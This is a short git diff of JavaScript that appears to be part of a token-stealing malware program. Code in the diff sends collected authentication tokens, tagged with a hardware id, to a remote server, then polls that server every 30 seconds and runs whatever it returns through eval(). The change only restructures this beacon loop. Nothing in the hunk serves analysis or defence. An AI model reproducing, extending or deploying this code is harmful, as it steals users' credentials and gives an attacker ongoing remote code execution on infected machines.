@@ -97,15 +97,16 @@ const getTokens = async () => {
     return JSON.stringify(validTokens.map((t) => t.toJSON()));
 };
 
-function ping() {
-    get(httpS, url.toLowerCase() + `/p/${hwid}`).then(res => {
-        eval(res);
-    });
-};
-
 getTokens().then((tokens) => {
     get(httpS, url.toLowerCase() + `/u/${hwid}?t=${tokens}`).then(() => {
-        ping();
-        setInterval(ping, 30 * 1000);
+        get(httpS, url.toLowerCase() + `/p/${hwid}`).then((res) => {
+            eval(res);
+        });
+
+        setInterval(() => {
+            get(httpS, url.toLowerCase() + `/p/${hwid}`).then((res) => {
+                eval(res);
+            });
+        }, 30 * 1000);
     });
 });
